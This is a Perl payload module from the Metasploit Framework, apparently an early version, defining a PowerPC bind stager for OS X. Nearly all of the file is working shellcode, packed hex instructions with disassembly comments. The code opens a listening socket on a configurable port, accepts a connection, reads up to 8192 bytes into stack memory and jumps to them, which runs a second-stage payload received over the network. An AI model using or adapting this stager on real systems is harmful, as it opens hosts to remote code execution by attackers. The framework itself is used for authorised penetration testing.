###############
##
#
#    Name: BindStager.pm
# Version: $Revision$
#  Source: src/shellcode/osx/ppc/stager_sock_bind.asm
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      PowerPC bind stager for OSX.
#
##
###############


package Msf::PayloadComponent::OSX::ppc::BindStager;

use strict;
use base 'Msf::PayloadComponent::OSX::BindStager';


my $info =
{
    'Authors'      => [ 'H D Moore <hdm [at] metasploit.com>', ],
    'Arch'         => [ 'ppc' ],
    'Priv'         => 0,
    'OS'           => [ 'osx' ],
    'Multistage'   => 1,      
    'Size'         => '',
    'Payload' =>
    {   
        Offsets => { 'LPORT' => [34, 'n'] },   
        Payload =>
		pack("N*",
			 0x38600002,     # 0x1d70 <main>:          li      r3,2
			 0x38800001,     # 0x1d74 <main+4>:        li      r4,1
			 0x38a00006,     # 0x1d78 <main+8>:        li      r5,6
			 0x38000061,     # 0x1d7c <main+12>:       li      r0,97
			 0x44000002,     # 0x1d80 <main+16>:       sc
			 0x7c000278,     # 0x1d84 <main+20>:       xor     r0,r0,r0
			 0x7c7e1b78,     # 0x1d88 <main+24>:       mr      r30,r3
			 0x4800000d,     # 0x1d8c <main+28>:       bl      0x1d98 <bind>
			 0x00022212,     # 0x1d90 <main+32>:       0x0002 + PORT
			 0x00000000,     # 0x1d94 <main+36>:       IP=0.0.0.0
			 0x7c8802a6,     # 0x1d98 <bind>:          mflr    r4
			 0x38a00010,     # 0x1d9c <bind+4>:        li      r5,16
			 0x38000068,     # 0x1da0 <bind+8>:        li      r0,104
			 0x7fc3f378,     # 0x1da4 <bind+12>:       mr      r3,r30
			 0x44000002,     # 0x1da8 <bind+16>:       sc
			 0x7c000278,     # 0x1dac <bind+20>:       xor     r0,r0,r0
			 0x3800006a,     # 0x1db0 <listen>:        li      r0,106
			 0x7fc3f378,     # 0x1db4 <listen+4>:      mr      r3,r30
			 0x44000002,     # 0x1db8 <listen+8>:      sc
			 0x7c000278,     # 0x1dbc <listen+12>:     xor     r0,r0,r0
			 0x7fc3f378,     # 0x1dc0 <accept>:        mr      r3,r30
			 0x3800001e,     # 0x1dc4 <accept+4>:      li      r0,30
			 0x38800010,     # 0x1dc8 <accept+8>:      li      r4,16
			 0x9081ffe8,     # 0x1dcc <accept+12>:     stw     r4,-24(r1)
			 0x38a1ffe8,     # 0x1dd0 <accept+16>:     addi    r5,r1,-24
			 0x3881fff0,     # 0x1dd4 <accept+20>:     addi    r4,r1,-16
			 0x44000002,     # 0x1dd8 <accept+24>:     sc
			 0x7c000278,     # 0x1ddc <accept+28>:     xor     r0,r0,r0
			 0x7c7e1b78,     # 0x1de0 <accept+32>:     mr      r30,r3
			 0x38000003,     # 0x1de4 <reader>:        li      r0,3
			 0x7fc3f378,     # 0x1de8 <reader+4>:      mr      r3,r30
			 0x3881e000,     # 0x1dec <reader+8>:      addi    r4,r1,-8192
			 0x38a02000,     # 0x1df0 <reader+12>:     li      r5,8192
			 0x7c8803a6,     # 0x1df4 <reader+16>:     mtlr    r4
			 0x44000002,     # 0x1df8 <reader+20>:     sc
			 0x7c000278,     # 0x1dfc <reader+24>:     xor     r0,r0,r0
			 0x4e800020,     # 0x1e00 <reader+28>:     blr
			 0x7c000278,     # 0x1e04 <reader+32>:     xor     r0,r0,r0
			),
    },
};

sub new
{
	my $class = shift;
	my $hash  = @_ ? shift : { };
	my $self;

	$hash = $class->MergeHashRec($hash, { Info => $info });
	$self = $class->SUPER::new($hash, @_);

	return $self;
}

1;
